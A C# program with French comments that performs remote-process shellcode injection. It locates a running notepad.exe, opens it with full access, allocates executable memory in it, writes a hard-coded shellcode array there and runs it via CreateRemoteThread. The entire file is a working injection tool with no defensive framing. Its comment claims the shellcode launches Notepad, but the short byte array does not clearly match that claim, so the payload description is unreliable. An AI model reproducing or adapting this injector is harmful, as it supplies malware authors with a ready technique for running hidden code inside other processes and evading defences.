using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellcodeInjector
{
    class Program
    {
        // Import des API Windows nécessaires
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            byte[] buffer, uint size, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Constants pour OpenProcess
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        // Constants pour VirtualAllocEx
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // Constant pour WaitForSingleObject
        const uint INFINITE = 0xFFFFFFFF;

        static void Main(string[] args)
        {
            try
            {
                // Trouver le processus cible "notepad"
                Process targetProcess = null;
                Process[] processes = Process.GetProcessesByName("notepad");

                if (processes.Length == 0)
                {
                    Console.WriteLine("Le processus notepad.exe n'est pas lancé. Lancez Notepad avant d'exécuter ce programme.");
                    return;
                }

                targetProcess = processes[0];
                Console.WriteLine($"Injection dans le processus {targetProcess.ProcessName} PID {targetProcess.Id}");

                // Shellcode qui lance notepad.exe (payload différent de calc.exe)
                // Exemple shellcode 64-bit qui lance notepad.exe (à adapter si besoin)
                byte[] shellcode = new byte[] {
                    0x48, 0x31, 0xC9, 0x65, 0x48, 0x8B, 0x41, 0x60, 0x48, 0x8B, 0x40, 0x18,
                    0x48, 0x8B, 0x70, 0x10, 0x48, 0xAD, 0x48, 0x96, 0x48, 0xAD, 0x48, 0x8B,
                    0x58, 0x30, 0x48, 0x85, 0xDB, 0x74, 0x6E, 0x48, 0x31, 0xC9, 0x80, 0x3B,
                    0x00, 0x75, 0x0A, 0x48, 0x8B, 0x53, 0x28, 0x48, 0x01, 0xDA, 0x48, 0x8B,
                    0x42, 0x20, 0x48, 0x89, 0x02, 0x48, 0x39, 0xD0, 0x75, 0xE7, 0x48, 0x31,
                    0xC9, 0x48, 0xFF, 0xC1, 0xE2, 0xED, 0xC3
                };

                // Ouvrir le processus cible avec tous les accès
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("Impossible d'ouvrir le processus cible.");
                    return;
                }

                // Allouer de la mémoire exécutable dans le processus cible
                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero,
                    (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (allocMemAddress == IntPtr.Zero)
                {
                    Console.WriteLine("Échec de l'allocation mémoire dans le processus cible.");
                    return;
                }

                // Copier le shellcode dans la mémoire allouée
                bool result = WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out _);
                if (!result)
                {
                    Console.WriteLine("Échec de l'écriture du shellcode dans la mémoire cible.");
                    return;
                }

                // Créer un thread distant pour exécuter le shellcode
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out _);
                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("Échec de la création du thread distant.");
                    return;
                }

                // Attendre la fin du thread distant
                WaitForSingleObject(hThread, INFINITE);
                Console.WriteLine("Injection terminée.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Erreur : {ex.Message}");
            }
        }
    }
}
